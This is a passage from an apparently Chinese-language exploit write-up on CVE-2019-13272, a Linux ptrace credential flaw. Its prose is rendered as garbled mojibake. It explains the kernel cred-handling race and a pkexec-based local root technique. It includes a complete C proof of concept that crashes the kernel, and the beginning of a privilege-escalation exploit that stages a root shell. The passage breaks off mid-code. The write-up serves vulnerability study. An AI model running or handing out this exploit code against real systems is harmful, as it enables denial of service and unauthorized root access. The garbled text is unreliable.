credï¼Œè¯¥å‡½æ•°ä¼šå°†å…¶å¼•ç”¨è®¡æ•° + 1ï¼Œè¿™çœ‹èµ·æ¥<strong>å¥½åƒæ²¡æœ‰ä»€ä¹ˆé—®é¢˜</strong>ï¼Œä¸æ˜¯ä¹ˆï¼Ÿæˆ‘ä»¬å¼•ç”¨äº†çˆ¶è¿›ç¨‹çš„ credï¼Œè‡ªç„¶å¼•ç”¨è®¡æ•°è¦ + 1ï¼Œå½“ ptrace æµç¨‹ç»“æŸåï¼Œå¼•ç”¨è®¡æ•°å† - 1ï¼Œè¿™ä¸€åˆ‡çœ‹èµ·æ¥ä¼¼ä¹å¾ˆæ­£å¸¸</p><p>å’‹ä¸€çœ‹è¿™ä¸ªæµç¨‹è®¾è®¡ä¼¼ä¹æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œä½†åœ¨ç«æ€æ¡ä»¶ä¸‹å°±ä¸ä¸€å®šäº†ï¼Œæˆ‘ä»¬ç°åœ¨å°†ç›®å…‰æ”¾åˆ°ä¸€ä¸ªå¯¹äº kernel pwner è€Œè¨€æˆ–è®¸éƒ½å¾ˆç†Ÿæ‚‰ä½†ä¸ä¸€å®šæ›¾æ·±å…¥ç ”ç©¶è¿‡çš„ä¸€ä¸ªå‡½æ•°â€”â€”<code>commit_creds</code>ï¼Œè¯¥å‡½æ•°å®šä¹‰äº <code>kernel/cred.c</code> ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å¦‚ä¸‹é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">commit_creds</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> cred *new)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">task</span> =</span> current;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">old</span> =</span> task-&gt;real_cred;<br>    <br>    <span class="hljs-comment">//...</span><br>    <br>    <span class="hljs-comment">/* release the old obj and subj refs both */</span><br>put_cred(old);<br>put_cred(old);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨è¯¥å‡½æ•°æœ«å°¾ä¼šä¸¤æ¬¡è°ƒç”¨ <code>put_cred()</code> å‡½æ•°ï¼Œè¯¥å‡½æ•°å®šä¹‰äº <code>/include/linux/cred.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">put_cred</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> cred *_cred)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">cred</span> =</span> (<span class="hljs-keyword">struct</span> cred *) _cred;<br><br>validate_creds(cred);<br><span class="hljs-keyword">if</span> (atomic_dec_and_test(&amp;(cred)-&gt;usage))<br>__put_cred(cred);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å…¶åŠŸèƒ½æ¯”è¾ƒç®€å•ï¼Œä¸€æ˜¯è°ƒç”¨ <code>validate_cred()</code> éªŒè¯ cred æ˜¯å¦åˆæ³•ï¼Œéšåä½¿ç”¨ <code>atomic_dec_and_test</code> å®å°† cred çš„å¼•ç”¨è®¡æ•°å‡ä¸€ï¼Œå¹¶ç¡®è®¤å…¶å¼•ç”¨è®¡æ•°æ˜¯å¦ä¸º 0ï¼Œè‹¥ä¸º 0 åˆ™è°ƒç”¨ <code>__put_cred()</code></p><p>é€šå¸¸æ¥è¯´ï¼Œåœ¨ commit_creds ä¸¤æ¬¡å‡å»å¼•ç”¨è®¡æ•°ï¼ˆcred ä¸€æ¬¡ï¼Œreal_cred ä¸€æ¬¡ï¼‰åæœ€ç»ˆæ‰§è¡Œæµéƒ½ä¼šèµ°åˆ° <code>__put_cred()</code>ï¼Œè¯¥å‡½æ•°å®šä¹‰äº <code>/kernel/cred.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * __put_cred - Destroy a set of credentials</span><br><span class="hljs-comment"> * @cred: The record to release</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Destroy a set of credentials on which no references remain.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> __put_cred(<span class="hljs-keyword">struct</span> cred *cred)<br>&#123;<br>kdebug(<span class="hljs-string">&quot;__put_cred(%p&#123;%d,%d&#125;)&quot;</span>, cred,<br>       <span class="hljs-type">atomic_read</span>(&amp;cred-&gt;usage),<br>       read_cred_subscribers(cred));<br><br>BUG_ON(<span class="hljs-type">atomic_read</span>(&amp;cred-&gt;usage) != <span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span><br>BUG_ON(read_cred_subscribers(cred) != <span class="hljs-number">0</span>);<br>cred-&gt;magic = CRED_MAGIC_DEAD;<br>cred-&gt;put_addr = __builtin_return_address(<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>BUG_ON(cred == current-&gt;cred);<br>BUG_ON(cred == current-&gt;real_cred);<br><br>call_rcu(&amp;cred-&gt;rcu, put_cred_rcu);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°å…¶ä¸€å¼€å§‹å…ˆéªŒè¯ cred çš„å¼•ç”¨è®¡æ•°ï¼Œéšåè°ƒç”¨ <code>call_rcu()</code>ï¼Œè¯¥å‡½æ•°çš„ä½œç”¨å¯ä»¥ç®€å•ç†è§£ä¸ºåœ¨ rcu æœºåˆ¶ä¸‹è°ƒç”¨å‡½æ•°æŒ‡é’ˆï¼Œè¿™é‡Œè°ƒç”¨çš„æ˜¯ <code>put_cred_rcu()</code> å‡½æ•°ï¼Œå®šä¹‰äº <code>/kernel/cred.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The RCU callback to actually dispose of a set of credentials</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">put_cred_rcu</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> rcu_head *rcu)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">cred</span> =</span> container_of(rcu, <span class="hljs-keyword">struct</span> cred, rcu);<br><br>kdebug(<span class="hljs-string">&quot;put_cred_rcu(%p)&quot;</span>, cred);<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span><br><span class="hljs-keyword">if</span> (cred-&gt;magic != CRED_MAGIC_DEAD ||<br>    <span class="hljs-type">atomic_read</span>(&amp;cred-&gt;usage) != <span class="hljs-number">0</span> ||<br>    read_cred_subscribers(cred) != <span class="hljs-number">0</span>)<br>panic(<span class="hljs-string">&quot;CRED: put_cred_rcu() sees %p with&quot;</span><br>      <span class="hljs-string">&quot; mag %x, put %p, usage %d, subscr %d\n&quot;</span>,<br>      cred, cred-&gt;magic, cred-&gt;put_addr,<br>      <span class="hljs-type">atomic_read</span>(&amp;cred-&gt;usage),<br>      read_cred_subscribers(cred));<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">if</span> (<span class="hljs-type">atomic_read</span>(&amp;cred-&gt;usage) != <span class="hljs-number">0</span>)<br>panic(<span class="hljs-string">&quot;CRED: put_cred_rcu() sees %p with usage %d\n&quot;</span>,<br>      cred, <span class="hljs-type">atomic_read</span>(&amp;cred-&gt;usage));<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>security_cred_free(cred);<br>key_put(cred-&gt;session_keyring);<br>key_put(cred-&gt;process_keyring);<br>key_put(cred-&gt;thread_keyring);<br>key_put(cred-&gt;request_key_auth);<br><span class="hljs-keyword">if</span> (cred-&gt;group_info)<br>put_group_info(cred-&gt;group_info);<br>free_uid(cred-&gt;user);<br>put_user_ns(cred-&gt;user_ns);<br>kmem_cache_free(cred_jar, cred);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯è§å…¶ä¼šåˆ¤æ–­ cred çš„å¼•ç”¨è®¡æ•°æ˜¯å¦ä¸º 0ï¼Œ<strong>è‹¥ä¸ä¸º 0 åˆ™ä¼šå¯¼è‡´ kernel panic</strong>ï¼Œåœ¨æ­£å¸¸æƒ…å†µä¸‹åˆ™æ˜¯å¸¸è§„çš„å°† cred é‡Šæ”¾å› cred_jar è¿™ä¸€ slub çš„æµç¨‹</p><p>çœ‹èµ·æ¥å¥½åƒæ²¡ä»€ä¹ˆé—®é¢˜ï¼Œåœ¨è¿›å…¥é‡Šæ”¾å‡½æ•°å‰å·²æœ‰ä¸€æ¬¡æ£€æŸ¥ï¼Œæƒ³å¿…æ²¡æœ‰å¯èƒ½å¼•èµ· kernel panicï¼Œ<strong>å®åˆ™ä¸ç„¶</strong>ï¼Œæˆ‘ä»¬è€ƒè™‘å¦‚ä¸‹ç«æ€åœºæ™¯ï¼š</p><ul><li>çˆ¶è¿›ç¨‹ä¸æ–­åœ°æ›´æ–°è‡ªèº« cred</li><li>å­è¿›ç¨‹ä¸æ–­åœ°è°ƒç”¨ <code>ptrace(PTRACE_TRACEME, 0, NULL, NULL)</code></li></ul><p>åœ¨è¿™ç§åœºæ™¯ä¸‹ï¼Œè‹¥æ˜¯çˆ¶è¿›ç¨‹åœ¨æ›´æ–°è‡ªèº« cred æ—¶ï¼Œåœ¨çˆ¶è¿›ç¨‹æ›¿æ¢è‡ªèº« cred ä¹‹å‰å­è¿›ç¨‹è·å–åˆ°äº†çˆ¶è¿›ç¨‹çš„æ—§ credï¼Œåœ¨çˆ¶è¿›ç¨‹è¿›å…¥åˆ° <code>put_cred_rcu</code> å‡½æ•°ä¹‹åå­è¿›ç¨‹åˆšå¥½æ‰å°†æ—§ cred çš„å¼•ç”¨è®¡æ•° +1ï¼Œæ­¤æ—¶ä¾¿<strong>æ— æ³•é€šè¿‡é‡Šæ”¾å‡½æ•°ä¸­çš„å¼•ç”¨è®¡æ•°æ£€æŸ¥ï¼Œä»è€Œé€ æˆ kernel panic</strong></p><h2 id="ptracer-cred-è®¾ç½®çš„é€»è¾‘é”™è¯¯å¯¼è‡´æœ¬åœ°ææƒ">ptracer_cred è®¾ç½®çš„é€»è¾‘é”™è¯¯å¯¼è‡´æœ¬åœ°ææƒ</h2><p>è¿™ä¸ªé€»è¾‘æ¼æ´çš„åˆ©ç”¨åœ¨ç¬”è€…çœ‹æ¥<strong>ååˆ†å·§å¦™</strong>ï¼Œåœ¨æ­£å¸¸æƒ…å†µä¸‹æ™®é€šæƒé™çš„ ptracer ç¡®ä¹æ˜¯æ— æ³•è°ƒè¯•æ‰§è¡Œ suid ç¨‹åºçš„ pracee çš„ï¼Œä½†æ˜¯ Jann Horn æå‡ºäº†ä¸€ä¸ªååˆ†å·§å¦™çš„<strong>å¤šçº§ ptrace æ–¹æ¡ˆ</strong></p><p>æˆ‘ä»¬ç°åœ¨æ¥è€ƒè™‘å¦‚ä¸‹åœºæ™¯ï¼š</p><ul><li>è¿›ç¨‹ A fork å‡ºå­è¿›ç¨‹ B</li><li>è¿›ç¨‹ B fork å‡ºå­è¿›ç¨‹ C</li><li>è¿›ç¨‹ B æ‰§è¡Œä¸€ä¸ª<strong>å…ˆææƒåé™æƒçš„</strong> suid ç¨‹åº</li><li>è¿›ç¨‹ C æ£€æµ‹åˆ°è¿›ç¨‹ B ææƒåå‘èµ· <code>PTRACE_RTRACEME</code> è¯·æ±‚ï¼Œéšåæ‰§è¡Œä¸€ä¸ª suid ç¨‹åºï¼Œæ­¤æ—¶å› ä¸ºè¿›ç¨‹ B å·²ç»ææƒæ‰€ä»¥ ptrace link å»ºç«‹æˆåŠŸï¼Œ<strong>æ­¤æ—¶è¿›ç¨‹ C ä¸º root æƒé™</strong></li><li>è¿›ç¨‹ A æ£€æµ‹åˆ°è¿›ç¨‹ B æ‰§è¡Œ suid ç¨‹åºåï¼Œä¸»åŠ¨ ptrace attach è¿›ç¨‹ B</li><li>æ­¤æ—¶<strong>è¿›ç¨‹ B å·²ç»å®Œæˆé™æƒï¼Œæ•…è¿›ç¨‹ A å¯ä»¥ ptrace è¿›ç¨‹ Bï¼Œè€Œè¿›ç¨‹ B å·²ç»ä¸è¿›ç¨‹ C å»ºç«‹äº† ptrace linkï¼Œæ­¤æ—¶è¿›ç¨‹ C åœ¨åˆ¤æ–­è¿›ç¨‹ B æƒé™æ—¶ä½¿ç”¨çš„æ˜¯æ­¤å‰ä¿å­˜çš„ root credï¼Œæ•…è¿›ç¨‹ B å¯ä»¥ ptrace è¿›ç¨‹ C è®©å…¶åœ¨ root æƒé™ä¸‹æ‰§è¡Œæ¶æ„ä»£ç </strong></li></ul><p>å¬èµ·æ¥ä¼¼ä¹éœ€è¦ä¸€äº›æ¡ä»¶ç«äº‰ï¼Ÿè€Œä¸”æˆ‘ä»¬ä¼¼ä¹å¾ˆéš¾æ‰¾åˆ°è¿™æ ·ä¸€ä¸ª suid ç¨‹åºï¼Œ<strong>è¿™ä»¤è¿™ä¸ªæ¼æ´å˜å¾—ååˆ†çš„é¸¡è‚‹</strong>ï¼Œæˆ‘ä»¬åªèƒ½åœ¨ä¸€äº›ç‰¹å®šå‘è¡Œç‰ˆä¸‹å®Œæˆåˆ©ç”¨</p><h1>0x02.æ¼æ´åˆ©ç”¨</h1><h2 id="åˆ©ç”¨ç«æ€æ¡ä»¶é€ æˆ-kernel-panic">åˆ©ç”¨ç«æ€æ¡ä»¶é€ æˆ kernel panic</h2><p>å‰é¢æˆ‘ä»¬å·²ç»è®²åˆ°å¼€ä¸¤ä¸ªè¿›ç¨‹è¿›è¡Œç«äº‰ä¾¿èƒ½è§¦å‘ kernel panicï¼Œè€Œåˆæ³•æ›´æ–°çˆ¶è¿›ç¨‹çš„ cred çš„æ–¹å¼æœ‰å¾ˆå¤šï¼Œä¾‹å¦‚ <code>setresuid</code> è¿™ä¸€ç³»åˆ—çš„ç³»ç»Ÿè°ƒç”¨ä¾¿èƒ½åˆæ³•æ›´æ–°è¿›ç¨‹çš„ credï¼Œè¿™é‡Œæˆ‘ä»¬ä¾¿é€‰ç”¨ setresuid ç³»ç»Ÿè°ƒç”¨</p><p>exp å¦‚ä¸‹ï¼Œè¿™é‡Œå‚è€ƒäº† jannh ç»™å‡ºçš„ pocï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">ptraceThread</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span><br>&#123;<br>    ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">pthread_t</span> child;<br>    <span class="hljs-type">int</span> uid;<br>    <span class="hljs-type">int</span> pid;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] CVE-2019-13272 POC of kernel panic.&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Written by arttnba3.&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Start exploiting...&quot;</span>);<br><br>    uid = getuid();<br>    pid = fork();<br>    <span class="hljs-keyword">if</span> (pid != <span class="hljs-number">0</span>) <span class="hljs-comment">// parent</span><br>    &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>        &#123;<br>            setresuid(uid, uid, uid);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-comment">// child</span><br>    &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>        &#123;<br>            pthread_create(&amp;child, <span class="hljs-literal">NULL</span>, ptraceThread, <span class="hljs-literal">NULL</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/01/14/Cl1RPwcj5s8OLrf.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°çš„æ˜¯æˆ‘ä»¬æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´é€ æˆäº† kernel panic</p><h2 id="åˆ©ç”¨é€»è¾‘é”™è¯¯è¿›è¡Œæœ¬åœ°ææƒ">åˆ©ç”¨é€»è¾‘é”™è¯¯è¿›è¡Œæœ¬åœ°ææƒ</h2><p>æˆ‘ä»¬å…ˆä»‹ç»ä¸€ä¸ªæ–°ç©æ„â€”â€”<code>PolKit</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºæ¡†æ¶ï¼Œç›¸æ¯”èµ· sudo ç­‰ä¼ ç»Ÿç‰¹æƒæˆæƒç¨‹åºï¼Œpolkit å¯ä»¥è¿›è¡Œæ›´ç»†ç²’åº¦çš„æƒé™æˆäºˆï¼Œè¿™é‡Œä¸æ·±å…¥ç ”ç©¶å…¶ç”¨æ³•</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦ç”¨åˆ°ä¸€ä¸ªå¤§éƒ¨åˆ† Linux æ¡Œé¢å‘è¡Œç‰ˆéƒ½æœ‰çš„ suid ç¨‹åºâ€”â€” <code>pkexec</code>ï¼Œè¿™æ˜¯ polkit ä¸­çš„å·¥å…·ä¹‹ä¸€ï¼Œå…¶å…è®¸è·å¾—æˆæƒçš„ç”¨æˆ·ä»¥å¦ä¸€ç”¨æˆ·çš„èº«ä»½æ‰§è¡Œç‰¹å®šç¨‹åºï¼Œå¦‚ä¸‹æ˜¯æˆ‘ä»¬å°†ä¼šç”¨åˆ°çš„æŒ‡ä»¤æ‰§è¡Œæ ¼å¼ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pkexec -user username some_programme_under_polkit</span><br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬ä½¿ç”¨ <code>-user</code> å‚æ•°æ—¶ï¼Œ pkexec ä¼š<strong>å…ˆå°†è¿›ç¨‹ææƒåˆ° rootï¼Œä¹‹åå†é™æƒåˆ°æŒ‡å®šç”¨æˆ·</strong>ï¼Œè¿™æ°å¥½å¯ä»¥ç”¨æ¥æ„é€ æˆ‘ä»¬ ptrace åˆ©ç”¨é“¾ä¸Šçš„è¿›ç¨‹ B</p><p>æ­¤å¤–ï¼Œæˆ‘ä»¬éœ€è¦æ‰§è¡Œä¸€ä¸ª<strong>åœ¨ polkit æ¡†æ¶ä¸‹è¿è¡Œçš„å¯æ‰§è¡Œç¨‹åº</strong>ï¼ˆJann Horn ç§°ä¹‹ä¸º helperï¼‰ï¼Œhelper éœ€è¦æ»¡è¶³çš„æ˜¯<strong>æ™®é€šç”¨æˆ·æ‰§è¡Œæ—¶ä¸éœ€è¦è®¤è¯</strong>ï¼ˆå¾ˆå¤š polkit ç¨‹åºæ‰§è¡Œæ—¶éƒ½éœ€è¦å¼¹çª—è®¤è¯ï¼‰</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬è§£å†³åˆ©ç”¨æµç¨‹ä¸­æ¡ä»¶ç«äº‰çš„é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨_ç®¡é“_æ¥æ§åˆ¶ç¨‹åºæ‰§è¡Œçš„æ—¶æœºï¼Œä»è€Œè®©å¯¹åº”çš„ä¸‰ä¸ªè¿›ç¨‹èƒ½å¤Ÿåœ¨å¯¹åº”æ—¶æœºæ‰§è¡Œå¯¹åº”æ“ä½œ</p><p>ä¸‹é¢æˆ‘ä»¬åˆ†é˜¶æ®µå¯¹ exp è¿›è¡Œè®²è§£ï¼Œè¿™é‡Œçš„ exp ç¬”è€…å‚è€ƒäº† Jann çš„exp è¿›è¡Œé‡æ–°ç¼–å†™ï¼Œç»è¿‡ç¬”è€…çš„ä¸€äº›<s>è‡ªä»¥ä¸ºæ˜¯çš„</s>ä¼˜åŒ–</p><h3 id="Setp-I-task-A-fork-task-B">Setp.I task A fork task B</h3><p>è¿™é‡Œçš„ main å‡½æ•°ç¬”è€…è®¾è®¡ä¸ºä¸»è¦å®ç° task A çš„åŠŸèƒ½ï¼ŒåŒæ—¶ä¹Ÿä½œä¸ºåé¢ task B ä¸ task C é€šè¿‡ execveat æ›¿æ¢è‡ªèº«é•œåƒæ—¶çš„è·³è½¬å…¥å£</p><p>findHelper() ç”¨ä»¥å¯»æ‰¾å½“å‰å¹³å°å¯ç”¨çš„ helperï¼Œä¸å†èµ˜å™</p><p>task A é¦–å…ˆéœ€è¦åˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œåé¢æˆ‘ä»¬éœ€è¦å°† task B çš„ stdout é‡å®šå‘è‡³è¯¥ç®¡é“ä»¥è®©å…¶å µå¡ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å°†ç®¡é“è®¾ä¸º <code>O_DIRECT</code> æ¨¡å¼ï¼Œè¿™æ„å‘³ç€è¯¥ç®¡é“ä¼ è¾“æ•°æ®çš„æ–¹å¼æ˜¯æŒ‰ â€œpacketâ€ è¿›è¡Œä¼ è¾“çš„ï¼Œéšåæˆ‘ä»¬å…ˆå¾€å…¶ä¸­å¡«å……ä¸€ä¸ª packetï¼Œåé¢ task B åœ¨å†™å…¥  stdout æ—¶ä¾¿ä¼šå µå¡ï¼ˆä¸ºä»€ä¹ˆè¦é˜»å¡åé¢ç»†è¯´ï¼‰</p><p>åˆ›å»ºå®Œæˆç®¡é“ä¹‹åä¾¿ fork å‡º task Bï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹ task B çš„æµç¨‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;stage2&quot;</span>))<br>        <span class="hljs-keyword">return</span> middleStage();<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;stage3&quot;</span>))<br>        <span class="hljs-keyword">return</span> getRootShell();<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] CVE-2019-13272 POC of local privileged.&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Written by arttnba3.&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Start exploiting...&quot;</span>);<br><br>    <span class="hljs-comment">// find the helper</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Finding the helper...&quot;</span>);<br>    helper = findHelper();<br>    helper_basename = basename(helper);<br>    <span class="hljs-keyword">if</span> (!helper)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[x] Unable to find suitable helper on your platform!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Using helper: %s\n&quot;</span>, helper);<br><br>    <span class="hljs-comment">// create the pipe for blocking child</span><br>    pipe2(pipe_for_block, O_DIRECT | O_CLOEXEC); <span class="hljs-comment">// set the pipe in packet mode, which meant that the data should be received in packets</span><br>    fcntl(pipe_for_block[<span class="hljs-number">0</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span>);<br>    write(pipe_for_block[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>); <span class="hljs-comment">// temp packet to make the following ones stuck, the stdout of task B will be redirect to it</span><br><br>    <span class="hljs-comment">// fork out task B</span><br>    <span class="hljs-comment">// two kinds of writing, all 